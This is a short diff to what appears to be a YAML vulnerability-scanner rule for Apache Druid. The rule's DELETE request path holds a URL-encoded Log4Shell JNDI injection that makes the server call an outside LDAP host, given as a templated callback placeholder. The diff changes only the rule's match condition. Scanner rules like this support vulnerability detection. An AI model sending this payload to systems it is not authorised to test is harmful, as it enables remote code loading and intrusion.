@@ -14,7 +14,7 @@ rules:
     request:
       method: DELETE
       path: /druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{dnstest}}%2ftea%7d
-    expression: "true"
+    expression: response.status >= 200
   r2:
     request:
       method: GET
